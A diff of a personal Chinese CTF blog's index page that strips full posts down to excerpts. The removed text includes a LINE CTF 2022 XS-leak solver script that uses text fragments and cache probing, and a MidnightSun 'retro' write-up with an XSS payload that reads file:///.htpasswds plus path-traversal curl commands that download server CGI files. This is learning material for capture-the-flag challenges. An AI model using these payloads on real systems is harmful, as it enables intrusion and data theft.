@@ -263,7 +263,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-04-13 12:51:22" itemprop="dateModified" datetime="2022-04-13T12:51:22+08:00">2022-04-13</time>
+      <time title="Modified: 2022-04-13 18:39:03" itemprop="dateModified" datetime="2022-04-13T18:39:03+08:00">2022-04-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -286,42 +286,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <h1 id="web题复现"><a href="#web题复现" class="headerlink" title="web题复现"></a>web题复现</h1><h3 id="title-todo"><a href="#title-todo" class="headerlink" title="title todo"></a>title todo</h3><p>解这个题需要先了解几个知识点</p>
-<h4 id="我的思路"><a href="#我的思路" class="headerlink" title="我的思路"></a>我的思路</h4><p>首先在 app.py 中注意到了 csp  非常严格</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_header</span>(<span class="params">response</span>):</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; style-src &#x27;self&#x27;; img-src &#x27;self&#x27; blob:&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
-
-
-
-<p>我们可以上传一张图片和一个title</p>
-<p>并且可以 share to admim</p>
-<p>然后我找了一个可以进行xss的点 位于 imge.html</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;title is-3&quot;</span>&gt;</span>&#123;&#123; image.title &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;&#123;</span> <span class="attr">image.url</span> &#125;&#125; <span class="attr">class</span>=<span class="string">&quot;mb-3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">hidden</span> <span class="attr">id</span>=<span class="string">&quot;imgId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; image.id &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">&#123;% if not shared %&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们发现 我们可控 <code>image.url</code>  并且可以造成xss （理论上）</p>
-<p><strong>但是我随即发现xss并不能成功 因为 csp 而我当时并没有意识到这一点 导致 我直接卡在了这里</strong></p>
-<h4 id="欠缺在哪里？"><a href="#欠缺在哪里？" class="headerlink" title="欠缺在哪里？"></a>欠缺在哪里？</h4><p>上传文件和</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/image/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_image</span>():</span><br><span class="line">    img_file = request.files[<span class="string">&#x27;img_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> img_file:</span><br><span class="line">        ext = os.path.splitext(img_file.filename)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> ext <span class="keyword">in</span> [<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>]:</span><br><span class="line">            filename = uuid4().<span class="built_in">hex</span> + ext</span><br><span class="line"></span><br><span class="line">            img_path = os.path.join(app.config.get(<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>), filename)</span><br><span class="line">            img_file.save(img_path)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;img_url&#x27;</span>: <span class="string">f&#x27;/static/image/<span class="subst">&#123;filename&#125;</span>&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/image&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_image</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">        img_url = request.form.get(<span class="string">&#x27;img_url&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> title <span class="keyword">and</span> img_url:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> img_url.startswith(<span class="string">&#x27;/static/image/&#x27;</span>):</span><br><span class="line">                flash(<span class="string">&#x27;Image creation failed&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;create_image&#x27;</span>))</span><br><span class="line"></span><br><span class="line">            image = Image(title=title, url=img_url, owner=current_user)</span><br><span class="line">            db.session.add(image)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            res = redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">            res.headers[<span class="string">&#x27;X-ImageId&#x27;</span>] = image.<span class="built_in">id</span></span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;create_image&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;create_image.html&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>也就是说 上传图像 和 上传 title 和 image.url 是分开的</p>
-<p>然后看一下 nginx 的</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /static &#123;</span><br><span class="line">            <span class="attribute">uwsgi_cache</span> one;</span><br><span class="line">            <span class="attribute">uwsgi_cache_valid</span> <span class="number">200</span> <span class="number">5m</span>;</span><br><span class="line">            <span class="attribute">uwsgi_ignore_headers</span> X-Accel-Redirect X-Accel-Expires Cache-Control Expires Vary;</span><br><span class="line">            </span><br><span class="line">            <span class="attribute">include</span> uwsgi_params;</span><br><span class="line">            <span class="attribute">uwsgi_pass</span> app;</span><br><span class="line"></span><br><span class="line">            <span class="attribute">add_header</span> X-Cache-Status <span class="variable">$upstream_cache_status</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>uwsgi_cache_valid</code> – 根据响应码设置缓存时间</p>
-<p>然后就要讲到一个很重要的知识点 </p>
-<p><a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/">https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/</a></p>
-<p><a target="_blank" rel="noopener" href="https://chromestatus.com/feature/4733392803332096">https://chromestatus.com/feature/4733392803332096</a></p>
-<p>其实这个已经在很多次比赛中出现过了 </p>
-<p>比如 PlaidCTF2020</p>
-<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/20254">https://ctftime.org/writeup/20254</a></p>
-<blockquote>
-<p>If a page contains images with <a target="_blank" rel="noopener" href="https://web.dev/native-lazy-loading/">Lazy Loading</a>, an attacker can detect if fragment navigation that included an image occurred by checking whether the image was <a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/cache-probing/">cached in the browser</a>. This works because <a target="_blank" rel="noopener" href="https://web.dev/native-lazy-loading/">Lazy Loading</a> images are only fetched (and cached) when they appear in the viewport.</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">chall_url = <span class="string">&quot;http://35.187.204.223&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="comment">#s.proxies.update(&#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;&#125;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_hit</span>(<span class="params">image</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;HIT&quot;</span> == s.head(chall_url + image).headers[<span class="string">&quot;X-Cache-Status&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">share</span>(<span class="params">path</span>):</span><br><span class="line">    s.post(chall_url + <span class="string">&quot;/share&quot;</span>,</span><br><span class="line">           headers=&#123;<span class="string">&quot;Content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;, json=&#123;<span class="string">&quot;path&quot;</span>: path&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_post</span>(<span class="params">image</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/image/&quot;</span> + s.post(chall_url + <span class="string">&quot;/image&quot;</span>, headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;, allow_redirects=<span class="literal">False</span>, data=&#123;</span><br><span class="line">           <span class="string">&quot;title&quot;</span>: <span class="string">&quot;W&quot;</span>*<span class="number">3000</span>, <span class="string">&quot;img_url&quot;</span>: image + <span class="string">&quot; loading=lazy&quot;</span></span><br><span class="line">    &#125;).headers[<span class="string">&quot;X-ImageId&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_image</span>():</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundarySyjbxI4bmreUQGnT&quot;</span>&#125;</span><br><span class="line">    data = <span class="string">&quot;------WebKitFormBoundarySyjbxI4bmreUQGnT\r\nContent-Disposition: form-data; name=\&quot;img_file\&quot;; filename=\&quot;foo.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\nfoo\r\n------WebKitFormBoundarySyjbxI4bmreUQGnT--\r\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> s.post(chall_url + <span class="string">&quot;/image/upload&quot;</span>, headers=headers, data=data).json()[<span class="string">&quot;img_url&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line">s.post(chall_url + <span class="string">&quot;/register&quot;</span>,</span><br><span class="line">       headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;, data=<span class="string">&quot;username=foofoo&amp;password=barbar&quot;</span>)</span><br><span class="line">s.post(chall_url + <span class="string">&quot;/login&quot;</span>,</span><br><span class="line">       headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;, data=<span class="string">&quot;username=foofoo&amp;password=barbar&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Registered&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">known = <span class="string">&quot;LINECTF&#123;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&quot;/0123456789abcdef&quot;</span>:</span><br><span class="line">        current_image = upload_image()</span><br><span class="line">        current_post = new_post(current_image)</span><br><span class="line">        </span><br><span class="line">        share(current_post[<span class="number">1</span>:] + <span class="string">&quot;#:~:text=&quot;</span> + known + char)</span><br><span class="line">        sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> is_hit(current_image):</span><br><span class="line">            known += char</span><br><span class="line">            <span class="built_in">print</span>(known)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Flag: &quot;</span> + known)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="参考大佬文章"><a href="#参考大佬文章" class="headerlink" title="参考大佬文章"></a>参考大佬文章</h4><p><a target="_blank" rel="noopener" href="https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e">https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/#title-todo">https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/#title-todo</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/04/12/LINECTF2022/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -383,7 +355,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-04-13 18:27:37" itemprop="dateModified" datetime="2022-04-13T18:27:37+08:00">2022-04-13</time>
+      <time title="Modified: 2022-04-13 18:38:55" itemprop="dateModified" datetime="2022-04-13T18:38:55+08:00">2022-04-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -405,20 +377,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="learn-month2"><a href="#learn-month2" class="headerlink" title="learn-month2"></a>learn-month2</h1><h2 id="day1-–-4-12"><a href="#day1-–-4-12" class="headerlink" title="day1 – 4.12"></a>day1 – 4.12</h2><h3 id="goals"><a href="#goals" class="headerlink" title="goals"></a>goals</h3><ul>
-<li>听一节汇编课</li>
-<li>听 pwn.college 第二课时</li>
-<li>复现一下 xs-leak 的小技巧</li>
-<li>有空填一下 srtp</li>
-</ul>
-<h2 id="day2-–-4-13"><a href="#day2-–-4-13" class="headerlink" title="day2 – 4.13"></a>day2 – 4.13</h2><ul>
-<li>听一节汇编课</li>
-<li>继续 pwn.college 第二课时</li>
-<li>学一下 FTP 相关漏洞</li>
-<li>继续复现LineCTF</li>
-<li>改 srtp 申报表</li>
-</ul>
-
+          <h1 id="learn-month2"><a href="#learn-month2" class="headerlink" title="learn-month2"></a>learn-month2</h1><p>第二月的学习记录</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/04/12/learn-month2/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -472,9 +439,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2022-04-11 12:13:15 / Modified: 12:15:08" itemprop="dateCreated datePublished" datetime="2022-04-11T12:13:15+08:00">2022-04-11</time>
+      <time title="Created: 2022-04-11 12:13:15" itemprop="dateCreated datePublished" datetime="2022-04-11T12:13:15+08:00">2022-04-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-04-13 18:39:09" itemprop="dateModified" datetime="2022-04-13T18:39:09+08:00">2022-04-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -497,47 +470,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <h1 id="MidSunCTF"><a href="#MidSunCTF" class="headerlink" title="MidSunCTF"></a>MidSunCTF</h1><p>啥都没做出来  感觉这学期水平没啥长进  主要是精力有点分散了  不过路还很长 加油~</p>
-<h2 id="retro"><a href="#retro" class="headerlink" title="retro"></a>retro</h2><blockquote>
-<p>Check out my homepage in cyber space</p>
-</blockquote>
-<p>尝试一下读文件 (后来想了下 这个想法可能是愚蠢的  或许这种方法只适合在特定的场合中使用)</p>
-<p><img src="D:\MyBlog\b1ue0cean.github.io\source_posts\MidnightCTF2022.assets\image-20220402184941839.png" alt="image-20220402184941839"></p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;./&quot;</span> <span class="attribute">height</span>=<span class="string">&quot;1600px&quot;</span> <span class="attribute">width</span>=<span class="string">&quot;800px&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Apache</span>/<span class="number">2</span>.<span class="number">4</span>.<span class="number">53</span> (Unix)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params">&#123;<span class="variable language_">document</span>.write(<span class="variable language_">this</span>.responseText)&#125;;x.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///.htpasswds&quot;</span>);x.send();</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="学习别人的解法"><a href="#学习别人的解法" class="headerlink" title="学习别人的解法"></a>学习别人的解法</h3><p>引用：<a target="_blank" rel="noopener" href="https://scavengersecurity.com/posts/midnightsunctf-retro/">https://scavengersecurity.com/posts/midnightsunctf-retro/</a></p>
-<p>在 <code>/cgi-bin/showimg.cgi?./1.gif</code>  这个接口似乎有问题</p>
-<p>但是 只能以 <code>.gif</code> 结尾   所以 我们要想办法来绕过？</p>
-<p>怎么绕过？</p>
-<p>看了两篇writeup 他们似乎风轻云淡的说 可以通过长度限制来绕过</p>
-<p>但究竟是为什么？ </p>
-<p>这可能要从这题的环境说起</p>
-<p>The environment is set up as follows:</p>
-<ul>
-<li>We don’t have ability to upload files</li>
-<li>It doesn’t have a database  (具体怎么看出来的我不太清楚)</li>
-<li>The data isn’t saved anywhere server-side and there are no cookies.</li>
-</ul>
-<p>如果按这个思路想下去 可以判断出(引用大佬分析)</p>
-<p>The points we came across with the testing is the following one:</p>
-<ul>
-<li>The user request is stored in a large buffer</li>
-<li>The extension comparison is successfully checked with this buffer</li>
-<li>The request is formatted into a smaller buffer so the exceeded characters are not included.</li>
-<li>If we exploit the buffer size differences, with correct length, final path may be clean of the mandatory <code>.gif</code> extension so we’re able to get any file in the server independent to the extension.</li>
-</ul>
-<p>so 可以构造一个截断的payload 来实现任意文件读取 （ 很难想到</p>
-<p>最终下载方式如下</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/usr/</span>local<span class="regexp">/apache2/</span>cgi-bin<span class="regexp">/color.cgi/</span>.gif -o color.cgi</span><br><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>apache2<span class="regexp">/cgi-bin/m</span>adlib.cgi/.gif -o madlib.cgi</span><br><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/usr/</span>local<span class="regexp">/apache2/</span>cgi-bin<span class="regexp">/lorem.cgi/</span>.gif -o lorem.cgi</span><br><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>apache2<span class="regexp">/cgi-bin/</span>joke.cgi/.gif -o joke.cgi</span><br><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/usr/</span>local<span class="regexp">/apache2/</span>cgi-bin<span class="regexp">/counter.cgi/</span>.gif -o counter.cgi</span><br></pre></td></tr></table></figure>
-
-<p>之后对CGI文件进行分析（由于偷懒 没环境复现了 学习一下 LFI</p>
-<p>留一个思考的问题 ： 如何判断一个端点容易受到文件包含的攻击</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/04/11/MidnightCTF2022/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -591,9 +531,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2022-03-17 20:44:47 / Modified: 20:46:24" itemprop="dateCreated datePublished" datetime="2022-03-17T20:44:47+08:00">2022-03-17</time>
+      <time title="Created: 2022-03-17 20:44:47" itemprop="dateCreated datePublished" datetime="2022-03-17T20:44:47+08:00">2022-03-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-04-13 18:39:32" itemprop="dateModified" datetime="2022-04-13T18:39:32+08:00">2022-04-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -616,10 +562,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <h1 id="路线"><a href="#路线" class="headerlink" title="路线"></a>路线</h1><p>不多bb 直接开学好吧 卷起来</p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1wF411e73j?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1wF411e73j?spm_id_from=333.337.search-card.all.click</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/datawhalechina/ML-FTTI">https://github.com/datawhalechina/ML-FTTI</a></p>
-<p><a target="_blank" rel="noopener" href="https://datawhalechina.github.io/ML-FTTI/01_tree_ensemble/01_tree.html#id1">https://datawhalechina.github.io/ML-FTTI/01_tree_ensemble/01_tree.html#id1</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/17/%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -681,7 +631,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-04-12 20:05:51" itemprop="dateModified" datetime="2022-04-12T20:05:51+08:00">2022-04-12</time>
+      <time title="Modified: 2022-04-13 18:39:24" itemprop="dateModified" datetime="2022-04-13T18:39:24+08:00">2022-04-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -704,60 +654,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <h1 id="UTCTF"><a href="#UTCTF" class="headerlink" title="UTCTF"></a>UTCTF</h1><p>我承认我这周摸鱼了 因为俄罗斯的游戏免费 2333  周一复现一下</p>
-<p><img src="./UTCTF.assets/image-20220314110537531.png" alt="image-20220314110537531"></p>
-<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Websockets"><a href="#Websockets" class="headerlink" title="Websockets"></a>Websockets</h3><p>看一下这个什么意思</p>
-<blockquote>
-<p>Can you hack my website?</p>
